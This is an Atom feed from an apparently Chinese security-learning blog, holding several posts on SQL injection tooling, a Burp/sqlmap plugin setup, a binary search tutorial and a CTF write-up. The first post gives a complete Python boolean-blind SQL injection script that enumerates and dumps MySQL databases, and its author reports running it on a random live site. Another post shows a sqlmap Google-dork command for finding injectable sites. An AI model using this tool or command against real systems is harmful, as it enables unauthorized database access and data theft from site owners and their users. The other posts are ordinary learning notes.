<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Lawliet Blog</title>
  
  <subtitle>原创文章，未经授权请勿转载</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2018-06-04T17:50:03.498Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>Lawliet</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>python编程实现自动化注入之布尔盲注</title>
    <link href="http://yoursite.com/2018/06/05/pyblindsqli/"/>
    <id>http://yoursite.com/2018/06/05/pyblindsqli/</id>
    <published>2018-06-04T17:22:39.311Z</published>
    <updated>2018-06-04T17:50:03.498Z</updated>
    
    <content type="html"><![CDATA[<h1 id="python编程实现自动化注入之布尔盲注"><a href="#python编程实现自动化注入之布尔盲注" class="headerlink" title="python编程实现自动化注入之布尔盲注"></a>python编程实现自动化注入之布尔盲注</h1><p><strong>python编程实现自动化注入这个话题很有可能会写成一个系列，主要希望通过编写自动化注入工具脚本来提高自己的python代码能力和sql注入的能力，mysql数据库常见的注入分为union注入，报错注入，布尔盲注和时间盲注，这篇文章先用布尔盲注工具的编写来开个头~主要会用到optparse库去解析命令行参数，同时会用到二分有序查找算法去猜解数据库的每个字符，optparse库的用法和二分法的好处在之前的文章里都写的很清楚了，开始编写吧</strong><br><a id="more"></a></p><h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p><strong>布尔盲注这种注入手法主要用于页面没有回显位置而且没有报错信息的情况下，这时可以构造逻辑判断，通过页面返回的不同去判断逻辑的真假从而猜取数据库的字符</strong></p><p><strong>所以可以通过python脚本循环猜解出数据库中的内容，二分法猜解字符会比一次次循环累加要快很多，主要的思路就是先用requests请求一个正常的页面，当然这个页面是存在sql注入的，然后通过requests请求加上单双引号的url所返回的页面，通过和正常页面对比来判断为数字型注入还是字符型注入，判断的方法</strong></p><pre><code>url参数后加单引号与双引号均报错，则为数字型注入url参数后加单引号报错双引号不报错，为字符型注入且参数外为单引号url参数后加单引号不报错双引号报错，为字符型注入且参数外为双引号</code></pre><p><strong>接着就是根据页面的不同判断数据库的个数和每个数据库名的长度，然后通过二分法判断出来每个数据库的名字，然后采取相同的方法判断出来指定数据库下的表名，指定数据库表名下的字段名以及数据库里的数据，贴出我写的代码</strong></p><pre><code>#coding=utf-8import requestsimport sysfrom optparse import OptionParserdef getdbnum(url,basehtml):    num=0    while 1:        payload=&quot;%s and (select count(*) from information_schema.schemata)=%s-- &quot;%(url,str(num))        html=requests.get(url=payload).content        if html==basehtml:            return num        else:            num=num+1def getdbs(url,basehtml,num):    for n in range(num):        length=0        while 1:            payload=&quot;%s and (select length(schema_name) from information_schema.schemata limit %s,1)=%s-- &quot;%(url,str(n),str(length))            html=requests.get(url=payload).content            if html==basehtml:                s=&quot;&quot;                for c in range(1,length+1):                    low=0                    high=126                    while low&lt;=high:                        mid=(low+high)/2                        payload=&quot;%s and ascii(substr((select schema_name from information_schema.schemata limit %s,1),%s,1))&gt;%s-- &quot;%(url,str(n),str(c),str(mid))                        html=requests.get(url=payload).content                            low=mid+1                        else:                            high=mid-1                    s=s+chr((low+high+1)/2)                    print s                break            else:                length=length+1def gettablenum(url,basehtml,dbname):    num=0    while 1:        payload=&quot;%s and (select count(*) from information_schema.tables where table_schema=0x%s)=%s-- &quot;%(url,dbname.encode(&quot;hex&quot;),str(num))        html=requests.get(url=payload).content        if html==basehtml:            return num        else:            num=num+1        def gettables(url,basehtml,num,dbname):    for n in range(num):        length=0        while 1:            payload=&quot;%s and (select length(table_name) from information_schema.tables where table_schema=0x%s limit %s,1)=%s-- &quot;%(url,dbname.encode(&quot;hex&quot;),str(n),str(length))            html=requests.get(url=payload).content            if html==basehtml:                s=&quot;&quot;                for c in range(1,length+1):                    low=0                    high=126                    while low&lt;=high:                        mid=(low+high)/2                        payload=&quot;%s and ascii(substr((select table_name from information_schema.tables where table_schema=0x%s limit %s,1),%s,1))&gt;%s-- &quot;%(url,dbname.encode(&quot;hex&quot;),str(n),str(c),str(mid))                        html=requests.get(url=payload).content                        if html==basehtml:                            low=mid+1                        else:                            high=mid-1                    s=s+chr((low+high+1)/2)                    print s                break            else:                length=length+1def getcolumnnum(url,basehtml,tablename,dbname):    num=0    while 1:        payload=&quot;%s and (select count(*) from information_schema.columns where table_name=0x%s and table_schema=0x%s)=%s-- &quot;%(url,tablename.encode(&quot;hex&quot;),dbname.encode(&quot;hex&quot;),str(num))        html=requests.get(url=payload).content        if html==basehtml:            return num        else:            num=num+1def getcolumns(url,basehtml,num,tablename,dbname):    for n in range(num):        length=0        while 1:            payload=&quot;%s and (select length(column_name) from information_schema.columns where table_name=0x%s and table_schema=0x%s limit %s,1)=%s-- &quot;%(url,tablename.encode(&quot;hex&quot;),dbname.encode(&quot;hex&quot;),str(n),str(length))            html=requests.get(url=payload).content            if html==basehtml:                s=&quot;&quot;                for c in range(1,length+1):                    low=0                    high=126                    while low&lt;=high:                        mid=(low+high)/2                        payload=&quot;%s and ascii(substr((select column_name from information_schema.columns where table_name=&apos;%s&apos; and table_schema=&apos;%s&apos; limit %s,1),%s,1))&gt;%s-- &quot;%(url,tablename,dbname,str(n),str(c),str(mid))                        html=requests.get(url=payload).content                        if html==basehtml:                            low=mid+1                        else:                            high=mid-1                    s=s+chr((low+high+1)/2)                    print s                break            else:                length=length+1def getdatanum(url,basehtml,tablename,dbname):    num=0    while 1:        payload=&quot;%s and (select count(*) from %s.%s)=%s-- &quot;%(url,dbname,tablename,str(num))        html=requests.get(url=payload).content        if html==basehtml:            return num        else:            num=num+1       def dumpdatas(url,basehtml,num,columnname,tablename,dbname):    for n in range(num):        length=0        while 1:            payload=&quot;%s and (select length(%s) from %s.%s limit %s,1)=%s-- &quot;%(url,columnname,dbname,tablename,str(n),str(length))            html=requests.get(url=payload).content            if html==basehtml:                s=&quot;&quot;                for c in range(1,length+1):                    low=0                    high=126                    while low&lt;=high:                        mid=(low+high)/2                        payload=&quot;%s and ascii(substr((select %s from %s.%s limit %s,1),%s,1))&gt;%s-- &quot;%(url,columnname,dbname,tablename,str(n),str(c),str(mid))                        html=requests.get(url=payload).content                        if html==basehtml:                            low=mid+1                        else:                            high=mid-1                    s=s+chr((low+high+1)/2)                    print s                break            else:                length=length+1def testurl(url,basehtml):    url1=&quot;%s&apos;&quot;%(url)    url2=&apos;%s&quot;&apos;%(url)    html1=requests.get(url1).content    html2=requests.get(url2).content    if basehtml!=html1 and basehtml!=html2:        return url    elif basehtml!=html1 and basehtml==html2:        return url1    elif basehtml==html1 and basehtml!=html2:        return url2    else:        return Falsedef main():    parser=OptionParser()    parser.add_option(&quot;-u&quot;,type=&quot;string&quot;,dest=&quot;url&quot;,help=&quot;-u url&quot;)    parser.add_option(&quot;-C&quot;,type=&quot;string&quot;,dest=&quot;column&quot;,help=&quot;-C column1,column2,...,...&quot;)    parser.add_option(&quot;-T&quot;,type=&quot;string&quot;,dest=&quot;table&quot;,help=&quot;-T table&quot;)    parser.add_option(&quot;-D&quot;,type=&quot;string&quot;,dest=&quot;db&quot;,help=&quot;-D dadabase&quot;)    parser.add_option(&quot;--dbs&quot;,action=&quot;store_true&quot;,dest=&quot;dbs&quot;,help=&quot;inject all databases&quot;)    parser.add_option(&quot;--dump&quot;,action=&quot;store_true&quot;,dest=&quot;dump&quot;,help=&quot;dump columns with selected table and database&quot;)    parser.add_option(&quot;--tables&quot;,action=&quot;store_true&quot;,dest=&quot;tables&quot;,help=&quot;inject all tables in selected database&quot;)    parser.add_option(&quot;--columns&quot;,action=&quot;store_true&quot;,dest=&quot;columns&quot;,help=&quot;inject all columns in selected table and database&quot;)    (options,args)=parser.parse_args()    if options.url and len(sys.argv)==3:        url=options.url        basehtml=requests.get(url=url).content        result=testurl(url,basehtml)        if result:            print &quot;this url maybe injectable&quot;        else:            print &quot;this url maybe notinjectable&quot;    elif options.url and options.dbs:#--dbs        url=options.url        basehtml=requests.get(url=url).content        url=testurl(url,basehtml)        num=getdbnum(url,basehtml)        getdbs(url,basehtml,num)    elif options.url and options.tables and options.db:#-u url --tables -D database        url=options.url        db=options.db        basehtml=requests.get(url=url).content        url=testurl(url,basehtml)        num=gettablenum(url,basehtml,db)        gettables(url,basehtml,num,db)    elif options.url and options.columns and options.table and options.db:#-u url --columns -T table -D database        url=options.url        table=options.table        db=options.db        basehtml=requests.get(url=url).content        url=testurl(url,basehtml)        num=getcolumnnum(url,basehtml,table,db)        getcolumns(url,basehtml,num,table,db)    elif options.url and options.dump and options.column and options.table and options.db:#-u url --dump  -C column -T table -D database        url=options.url        column=options.column        table=options.table        db=options.db        columns=column.split(&quot;,&quot;)        basehtml=requests.get(url=url).content        url=testurl(url,basehtml)        num=getdatanum(url,basehtml,table,db)        for column in columns:            dumpdatas(url,basehtml,num,column,table,db)    else:        parser.print_help()if __name__==&apos;__main__&apos;:    main()</code></pre><p><strong>使用方法，类似于sqlmap</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180605/mikhegHaae.png?imageslim" alt="mark"><br><strong>随便测试网上一个注入点来测试写的工具是否可以使用，可以看到成功注入出来了数据库，当然经过测试也能注入出表字段和数据库内容，这个工具只是初步完成了，当然还有很多的不足，这些都需要自己不断的去完善</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180605/KeIKGl7bmG.png?imageslim" alt="mark"></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;python编程实现自动化注入之布尔盲注&quot;&gt;&lt;a href=&quot;#python编程实现自动化注入之布尔盲注&quot; class=&quot;headerlink&quot; title=&quot;python编程实现自动化注入之布尔盲注&quot;&gt;&lt;/a&gt;python编程实现自动化注入之布尔盲注&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;python编程实现自动化注入这个话题很有可能会写成一个系列，主要希望通过编写自动化注入工具脚本来提高自己的python代码能力和sql注入的能力，mysql数据库常见的注入分为union注入，报错注入，布尔盲注和时间盲注，这篇文章先用布尔盲注工具的编写来开个头~主要会用到optparse库去解析命令行参数，同时会用到二分有序查找算法去猜解数据库的每个字符，optparse库的用法和二分法的好处在之前的文章里都写的很清楚了，开始编写吧&lt;/strong&gt;&lt;br&gt;
    
    </summary>
    
      <category term="python编程" scheme="http://yoursite.com/categories/python%E7%BC%96%E7%A8%8B/"/>
    
    
      <category term="python" scheme="http://yoursite.com/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>python optparse模块使用总结</title>
    <link href="http://yoursite.com/2018/06/05/pyoptparse/"/>
    <id>http://yoursite.com/2018/06/05/pyoptparse/</id>
    <published>2018-06-04T16:08:28.330Z</published>
    <updated>2018-06-04T17:13:29.845Z</updated>
    
    <content type="html"><![CDATA[<h1 id="python-optparse模块使用总结"><a href="#python-optparse模块使用总结" class="headerlink" title="python optparse模块使用总结"></a>python optparse模块使用总结</h1><p><strong>之前用过的一个python库，可以实现解析命令行参数实现命令行交互，最近再写自动化sql注入工具需要实现命令行交互的功能，由于好久不写，可多细节方面都想不起来了，又重新温习了一下这个库，在这里记录一下使用方法和一些容易被忽视的细节</strong><br><a id="more"></a></p><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p><strong>首先需要导入optparse模块中的OptionParser类，这个类里面有设置和解析命令行参数的方法，然后创建它的一个实例</strong></p><pre><code>from optparse import OptionParserparser = OptionParser()</code></pre><p><strong>调用该类的add_option方法设置命令行参数</strong></p><pre><code>parser.add_option(&quot;-自定义的参数识别标签&quot;,&quot;--自定义的参数识别标签&quot;,action=&quot;store/store_true/store_false&quot;,type=&quot;string/...&quot;,dest=&quot;&quot; help=&quot;&quot;)</code></pre><p><strong>该函数里面比较重要的几个参数的用法</strong></p><pre><code>首先是第一和第二个参数作为调用时的参数的标签，会被识别action参数：action参数告诉optparse当它在命令行中遇到选项时该做什么。action有三种存储方式：store、store_false、store_true。如果不指定action的值，默认的是store，store需要在命令行中，标签后跟上参数，并将该命令行参数的值赋值给dest参数中指定的变量。如果action值为store_true，那么在命令行中，参数的标签后不需要跟参数，如果命令行中使用了该参数标签，那么该命令行参数的dest变量的值会为True，store_flase同样不需要指定参数，不过不同的是，指定为store_false的参数标签，其dest的值在标签设置时会被设为Falsetype参数type指定dest参数中设置的变量的存储类型，默认为stringdest参数里面的值为变量名，当action被设置为store时，该变量用户接受参数标签后的参数值help参数设置要显示的参数的帮助信息</code></pre><p><strong>设置完命令行参数后需要解析命令行参数，使用该类的parse_args方法</strong></p><pre><code>(options, args) = parser.parse_args()</code></pre><p><strong>该方法会返回两个对象，options为字典类型，里面存放了dest中设置的变量和其对应的命令行参数值，args为列表类型，里面存放多余的命令行参数，一个参数标签后只能跟一个参数，多余的会被存在args中</strong></p><p><strong>在python中使用命令行中的参数，解析完了命令行参数，就可以在python中直接调用了，调用方法</strong></p><pre><code>options.dest中设置的变量名</code></pre><p><strong>通过这种方式就能取到命令行中的参数值了</strong></p><h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><p><strong>为了更深的理解，给出几个实例</strong></p><p><strong>实例1.action的值为store默认值：</strong></p><pre><code>&gt;&gt;&gt; from optparse import OptionParser&gt;&gt;&gt; parser=OptionParser()&gt;&gt;&gt; parser.add_option(&quot;-u&quot;,&quot;--url&quot;,action=&quot;store&quot;,type=&quot;string&quot;,dest=&quot;url&quot;,help=&quot;-u/--url url&quot;)&lt;Option at 0x268ce88: -u/--url&gt;&gt;&gt;&gt; args=[&quot;-h&quot;]&gt;&gt;&gt; (options,args)=parser.parse_args(args)Usage:  [options]Options:    -h, --help         show this help message and exit    -u URL, --url=URL  -u/--url url&gt;&gt;&gt; args=[&quot;-u&quot;,&quot;inputurl1&quot;,&quot;inputurl2&quot;,&quot;inputurl2&quot;]&gt;&gt;&gt; (options,args)=parser.parse_args(args)&gt;&gt;&gt; print &quot;%s,%s&quot;%(options,args){&apos;url&apos;: &apos;inputurl1&apos;},[&apos;inputurl2&apos;, &apos;inputurl2&apos;]&gt;&gt;&gt; print options.url&gt;&gt;&gt; inputurl1&gt;&gt;&gt; args=[&quot;--url&quot;,&quot;inputurl1&quot;,&quot;inputurl2&quot;,&quot;inputurl2&quot;]&gt;&gt;&gt; (options,args)=parser.parse_args(args)&gt;&gt;&gt; print &quot;%s,%s&quot;%(options,args){&apos;url&apos;: &apos;inputurl1&apos;},[&apos;inputurl2&apos;, &apos;inputurl2&apos;]&gt;&gt;&gt; args=[]&gt;&gt;&gt; (options,args)=parser.parse_args(args)&gt;&gt;&gt; print &quot;%s,%s&quot;%(options,args){&apos;url&apos;: None},[]&gt;&gt;&gt;</code></pre><p><strong>实例2.action的值为store_true</strong></p><pre><code>&gt;&gt;&gt; from optparse import OptionParser&gt;&gt;&gt; parser=OptionParser()&gt;&gt;&gt; parser.add_option(&quot;--dbs&quot;,action=&quot;store_true&quot;,dest=&quot;dbs&quot;,help=&quot;--dbs&quot;)&lt;Option at 0x2316048: --dbs&gt;&gt;&gt;&gt; args=[&quot;--dbs&quot;]&gt;&gt;&gt; (options,args)=parser.parse_args(args)&gt;&gt;&gt; print &quot;%s,%s&quot;%(options,args){&apos;dbs&apos;: True},[]&gt;&gt;&gt; print options.dbsTrue&gt;&gt;&gt; args=[]&gt;&gt;&gt; (options,args)=parser.parse_args(args)&gt;&gt;&gt; print &quot;%s,%s&quot;%(options,args){&apos;dbs&apos;: None},[]&gt;&gt;&gt; print options.dbsNone&gt;&gt;&gt; args=[&quot;-h&quot;]&gt;&gt;&gt; (options,args)=parser.parse_args(args)Usage:  [options]Options:    -h, --help  show this help message and exit    --dbs       --dbsG:\代码&gt;</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;python-optparse模块使用总结&quot;&gt;&lt;a href=&quot;#python-optparse模块使用总结&quot; class=&quot;headerlink&quot; title=&quot;python optparse模块使用总结&quot;&gt;&lt;/a&gt;python optparse模块使用总结&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;之前用过的一个python库，可以实现解析命令行参数实现命令行交互，最近再写自动化sql注入工具需要实现命令行交互的功能，由于好久不写，可多细节方面都想不起来了，又重新温习了一下这个库，在这里记录一下使用方法和一些容易被忽视的细节&lt;/strong&gt;&lt;br&gt;
    
    </summary>
    
      <category term="python编程" scheme="http://yoursite.com/categories/python%E7%BC%96%E7%A8%8B/"/>
    
    
      <category term="python" scheme="http://yoursite.com/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>python有序二分查找算法</title>
    <link href="http://yoursite.com/2018/06/04/pybinarysearch/"/>
    <id>http://yoursite.com/2018/06/04/pybinarysearch/</id>
    <published>2018-06-04T15:35:01.833Z</published>
    <updated>2018-06-04T16:06:21.475Z</updated>
    
    <content type="html"><![CDATA[<h1 id="python有序二分查找算法"><a href="#python有序二分查找算法" class="headerlink" title="python有序二分查找算法"></a>python有序二分查找算法</h1><p><strong>感觉自己的博客更新的很慢，看到自己博客不更新文章的话总会很焦虑，因为总想写点有意义的技术文章，但是想了想，博客本来就是一个记录知识的地方，将自己学习的过程记录下来也是个不错的选择，即使是一个小知识点也值得记录，以便以后不会忘记，所以以后博客的更新次数应该会很频繁，博客的日志是时候该充实一下了。写给自己，迷茫的时候多研究点知识，多写博客总结，知识需要不断沉淀</strong></p><p><strong>记录一个用python写SQL盲注脚本时需要用到的一个算法，在使用盲注的技术去判断数据库的内容时，使用二分法可以加快查找速度，相比于自加的判断可以减少所发送的http请求</strong><br><a id="more"></a></p><p>###二分查找算法代码###<br><strong>首先需要给定一个查找的范围，也就是区域。其次要求被查找的列表是有序的，贴出代码</strong></p><pre><code>#coding=utf-8def binary_search(sealist,find):    low=0    high=len(sealist)    while low&lt;=high:        mid=(low+high)/2        if find==sealist[mid]:            return mid        elif find&lt;sealist[mid]:            high=mid-1        elif find&gt;sealist[mid]:            low=mid+1        else:            return -1sealist=range(0,1000)find=input(&quot;please input a number:&quot;)result=binary_search(sealist,find)if result&gt;=0:    print &quot;Catch Element %s!    Position:%s!&quot;%(str(find),str(result+1))else:    print &quot;Sorry,The Element Not Found.&quot;</code></pre><p><strong>利用二分法通过不断地缩小查找区域最终锁定查找的内容，二分法相比于普通的循环自增查找，查找次数减少了很多，速度自然提升了不少。举个例子，如果采用自增查找的方式，在0-1000列表中查找到100的位置需要101次，但是上面的代码利用了有序二分查找到100的位置只需要7次</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180604/0F8j4m5mfK.png?imageslim" alt="mark"></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;python有序二分查找算法&quot;&gt;&lt;a href=&quot;#python有序二分查找算法&quot; class=&quot;headerlink&quot; title=&quot;python有序二分查找算法&quot;&gt;&lt;/a&gt;python有序二分查找算法&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;感觉自己的博客更新的很慢，看到自己博客不更新文章的话总会很焦虑，因为总想写点有意义的技术文章，但是想了想，博客本来就是一个记录知识的地方，将自己学习的过程记录下来也是个不错的选择，即使是一个小知识点也值得记录，以便以后不会忘记，所以以后博客的更新次数应该会很频繁，博客的日志是时候该充实一下了。写给自己，迷茫的时候多研究点知识，多写博客总结，知识需要不断沉淀&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;记录一个用python写SQL盲注脚本时需要用到的一个算法，在使用盲注的技术去判断数据库的内容时，使用二分法可以加快查找速度，相比于自加的判断可以减少所发送的http请求&lt;/strong&gt;&lt;br&gt;
    
    </summary>
    
      <category term="python编程" scheme="http://yoursite.com/categories/python%E7%BC%96%E7%A8%8B/"/>
    
    
      <category term="算法" scheme="http://yoursite.com/tags/%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>burpsuite中配置使用sqlmapapi</title>
    <link href="http://yoursite.com/2018/06/03/BurpSQLiPY/"/>
    <id>http://yoursite.com/2018/06/03/BurpSQLiPY/</id>
    <published>2018-06-03T09:43:56.948Z</published>
    <updated>2018-06-03T13:03:49.030Z</updated>
    
    <content type="html"><![CDATA[<h1 id="burpsuite中配置使用sqlmapapi"><a href="#burpsuite中配置使用sqlmapapi" class="headerlink" title="burpsuite中配置使用sqlmapapi"></a>burpsuite中配置使用sqlmapapi</h1><p><strong>burpsuite的Extender中有很多有用的扩展插件可以方便安全人员渗透测试，其中一个名为<code>SQLiPY</code>的插件可以直接在burpsuite中调用sqlmapapi进行测试，自己在安装这个插件的时候遇到了很多坑，属于那种百度谷歌都查不出解决方案的问题。最终终于捣腾出来了，在这记录一下</strong><br><a id="more"></a></p><h3 id="SQLiPY插件安装"><a href="#SQLiPY插件安装" class="headerlink" title="SQLiPY插件安装"></a>SQLiPY插件安装</h3><p><strong>打开burpsuite,在Extender模块中的BApp Store中找到SQLiPY插件</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180603/GjeAJ3i0KF.png?imageslim" alt="mark"><br><strong>可以看到安装该插件需要的环境</strong></p><pre><code>Jython 2.7.0 or newerJava 1.7 or 1.8 (the beta version of Jython 2.7 requires this).Python 2 (already installed on most Unix distributions)</code></pre><p><strong>java和python环境都有了，还需要Jython2.7.0或者更新的，去<a href="http://www.jython.org/downloads.html" title="Jython官网" target="_blank" rel="external">Jython官网</a>下载一个jar包即可</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180603/L73Lejlcak.png?imageslim" alt="mark"><br><strong>可以看到关于Jython2.7.0版本官网上有两个地方可以下载，第一个jar需要安装，英文意思是<code>安装可以执行jar的jython</code>，但是自己安装后在burpsuite中导入jython.jar去安装<code>SQLiPY</code>后会报出<code>Cannot create PyString with non-byte value</code>的错误，也就是SQLiPY插件虽然下载成功但是无法导入进burpsuite，问了很多同学，有的人安装完成导入后并不会报错，但是有的人就是会报错，我就属于会报错的那种，解决方案也很简单注意在这下载第二个jar包</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180603/b3517eB6h1.png?imageslim" alt="mark"><br><strong>英文意思是<code>在java应用程序中嵌入Jython</code>,这个jar包不需要安装，直接导入即可，在Extender模块中的Options中的<code>Python Environment</code>中，可以将下载的jar包导入到burpsuite中</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180603/KGa1HA8fm7.png?imageslim" alt="mark"><br><strong>然后就可以在BApp Store安装<code>SQLiPY</code>这个插件了，安装过程比较久，但是可以安装成功，注意安装的<code>SQLiPY.py</code>会默认在计算机的用户目录下，所以目录名里不能有中文和引号等字符，不然会在burpsuite导入<code>SQLiPY</code>插件时出现java报错，之前我的计算机用户里面有个引号就加载不进来，所以这一点要十分注意</strong></p><h3 id="SQLiPY插件的使用"><a href="#SQLiPY插件的使用" class="headerlink" title="SQLiPY插件的使用"></a>SQLiPY插件的使用</h3><p><strong>这个插件确实很强大方便，可以在渗透测试的时候直接在burpsuite中通过sqlmapapi使用sqlmap</strong></p><p><strong>首先在该插件下选择python.exe</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180603/9ddgAG0HJd.png?imageslim" alt="mark"><br><strong>之后点击<code>Start API</code>就可以启动API使用这个插件了，用burpsuite抓包时看到一个可能存在注入的参数，可以右键SQLiPY Scan直接将数据包发给SQLiPY插件，使用sqlmap去测试该注入点</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180603/l55g8GG4gA.png?imageslim" alt="mark"><br><strong>如果存在注入，就会在Scanner模块中显示出来</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180603/C1FaE583H6.png?imageslim" alt="mark"></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;burpsuite中配置使用sqlmapapi&quot;&gt;&lt;a href=&quot;#burpsuite中配置使用sqlmapapi&quot; class=&quot;headerlink&quot; title=&quot;burpsuite中配置使用sqlmapapi&quot;&gt;&lt;/a&gt;burpsuite中配置使用sqlmapapi&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;burpsuite的Extender中有很多有用的扩展插件可以方便安全人员渗透测试，其中一个名为&lt;code&gt;SQLiPY&lt;/code&gt;的插件可以直接在burpsuite中调用sqlmapapi进行测试，自己在安装这个插件的时候遇到了很多坑，属于那种百度谷歌都查不出解决方案的问题。最终终于捣腾出来了，在这记录一下&lt;/strong&gt;&lt;br&gt;
    
    </summary>
    
      <category term="工具使用" scheme="http://yoursite.com/categories/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"/>
    
    
      <category term="burpsuite" scheme="http://yoursite.com/tags/burpsuite/"/>
    
  </entry>
  
  <entry>
    <title>解决sqlmap不能使用-g的问题</title>
    <link href="http://yoursite.com/2018/06/02/sqlmapgsearch/"/>
    <id>http://yoursite.com/2018/06/02/sqlmapgsearch/</id>
    <published>2018-06-02T03:33:04.780Z</published>
    <updated>2018-06-04T15:14:02.931Z</updated>
    
    <content type="html"><![CDATA[<h1 id="解决sqlmap不能使用-g的问题"><a href="#解决sqlmap不能使用-g的问题" class="headerlink" title="解决sqlmap不能使用-g的问题"></a>解决sqlmap不能使用-g的问题</h1><p><strong>sqlmap的-g参数的功能可以自动的使用google语法搜索注入点进行注入</strong></p><p><strong>之前使用赛风vpn时sqlmap的-g是可以用的，但是由于之后换成了shadowsocks后发现-g功能不能用了，百度谷歌都没有搜到这个问题的解决办法，将我的结果方案写到这里</strong><br><a id="more"></a><br><strong>可以看到<code>sqlmap -g</code>不能使用</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180602/KJbgc22Eae.png?imageslim" alt="mark"></p><p><strong>我的ss客户端为本地1088端口，使用<code>sqlmap -g</code>时指定本地的ss端口作为代理即可</strong></p><pre><code>sqlmap -g &quot;inurl:php?id=&quot; --proxy &quot;http://127.0.0.1:1088&quot;</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180602/I3jKBLa24e.png?imageslim" alt="mark"><br><strong>可以看到此时sqlmap的谷歌语法搜索注入点便可以使用了。这是sqlmap的一个很强大的功能</strong></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;解决sqlmap不能使用-g的问题&quot;&gt;&lt;a href=&quot;#解决sqlmap不能使用-g的问题&quot; class=&quot;headerlink&quot; title=&quot;解决sqlmap不能使用-g的问题&quot;&gt;&lt;/a&gt;解决sqlmap不能使用-g的问题&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;sqlmap的-g参数的功能可以自动的使用google语法搜索注入点进行注入&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;之前使用赛风vpn时sqlmap的-g是可以用的，但是由于之后换成了shadowsocks后发现-g功能不能用了，百度谷歌都没有搜到这个问题的解决办法，将我的结果方案写到这里&lt;/strong&gt;&lt;br&gt;
    
    </summary>
    
      <category term="工具使用" scheme="http://yoursite.com/categories/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"/>
    
    
      <category term="sqlmap" scheme="http://yoursite.com/tags/sqlmap/"/>
    
  </entry>
  
  <entry>
    <title>ISCC2018 write up</title>
    <link href="http://yoursite.com/2018/05/25/iscc2018/"/>
    <id>http://yoursite.com/2018/05/25/iscc2018/</id>
    <published>2018-05-25T12:04:18.581Z</published>
    <updated>2018-06-04T15:04:26.787Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ISCC2018-write-up"><a href="#ISCC2018-write-up" class="headerlink" title="ISCC2018 write up"></a>ISCC2018 write up</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p><strong>参加2018年的ISCC竞赛，将做出的题记录到这里,记录一下思路，沉淀一下</strong><br><a id="more"></a></p><h2 id="Web方向"><a href="#Web方向" class="headerlink" title="Web方向"></a>Web方向</h2><h3 id="比较数字大小"><a href="#比较数字大小" class="headerlink" title="比较数字大小"></a>比较数字大小</h3><p><strong>HINT：只要比服务器上的数字大就好了</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180503/k890aKHIcH.png?imageslim" alt="mark"><br><strong>发现题目只有一个输入框，限制只能输入3个字符，于是firebug查看元素，发现maxlength值为3，将3改为100，随意输入个大数字，flag就出来了</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180503/KB7LcgEd58.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180503/9FAh3mK44g.png?imageslim" alt="mark"><br><code>flag:key is 768HKyu678567&amp;*&amp;K</code></p><h3 id="本地的诱惑"><a href="#本地的诱惑" class="headerlink" title="本地的诱惑"></a>本地的诱惑</h3><p><strong>HINT：小明扫描了他心爱的小红的电脑，发现开放了一个8013端口，但是当小明去访问的时候却发现只允许从本地访问，可他心爱的小红不敢让这个诡异的小明触碰她的电脑，可小明真的想知道小红电脑的8013端口到底隐藏着什么秘密(key)？（签到题）</strong></p><p><strong>该题为web的签到题，打开后发现是这样的</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180503/aKd6GiJf4J.png?imageslim" alt="mark"><br><strong>必须从本地访问，于是想到了伪造X-Forwarded-For，后来发现直接访问源代码就能得到flag，果然是签到题啊</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180503/I3BaAJJmlC.png?imageslim" alt="mark"><br><code>flag:ISCC{^&amp;*(UIHKJjkadshf}</code></p><h3 id="你能跨过去吗？"><a href="#你能跨过去吗？" class="headerlink" title="你能跨过去吗？"></a>你能跨过去吗？</h3><p><strong>HINT:如果你对xss了解的话,那你一定知道key是什么了，加油！</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180503/h75EeL54G5.png?imageslim" 